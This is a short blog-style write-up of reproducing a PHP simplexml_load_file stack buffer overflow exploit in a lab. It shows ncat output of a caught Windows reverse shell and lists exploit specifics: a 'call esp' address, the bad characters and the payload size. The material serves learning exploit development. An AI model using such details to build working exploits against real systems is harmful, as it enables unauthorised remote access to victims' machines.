#Php Simplexml_load_file Stack Overflow

    osce32@ubuntu:~# ncat -lvp 4444
    Ncat: Version 7.25BETA2 ( https://nmap.org/ncat )
    Ncat: Listening on :::4444
    Ncat: Listening on 0.0.0.0:4444
    Ncat: Connection from 192.168.126.134.
    Ncat: Connection from 192.168.126.134:49255.
    Microsoft Windows [Version 6.1.7601]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

    C:\Users\IEUser\Desktop>

Came across an exploit that was found by Yakir Wizman, which you can find here: 
http://www.black-rose.ml/2016/09/exploiting-php-for-fun-and-non-profit.html  
I highly suggest reading as he has very interesting work :)

Thought it would be awesome to see how he did it and learned a few things along the way as I have never done it to anything PHP. This was pretty interesting to say the least in making it work :)

So what I used were: 
1. 0x1017c6af : call esp
2. Bad chars were: 0x00 and 0x5c
3. Payload is 371 bytes. It's a reverse shell so it only works for me ;)
